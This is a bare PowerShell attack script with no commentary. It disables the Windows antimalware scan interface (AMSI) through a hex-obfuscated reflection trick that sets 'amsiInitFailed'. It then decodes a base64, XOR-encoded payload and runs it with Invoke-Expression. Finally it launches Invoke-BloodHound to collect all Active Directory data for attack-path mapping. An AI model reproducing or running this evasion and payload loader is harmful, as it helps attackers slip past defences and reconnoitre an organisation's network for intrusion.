[Ref].Assembly.GetType('System'+$("2E 4D 61 6E 61 67 65 6D 65 6E 74 2E 41 75 74 6F 6D 61 74 69 6F 6E 2E".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result1=$result1+$_};$result1)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)


$enc = [system.Text.Encoding]::UTF8


$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
$data = $enc.GetBytes($file)|%{$_-bXor0x11}
iex ([System.Text.Encoding]::ASCII.GetString($data))
Invoke-BloodHound -CollectionMethod All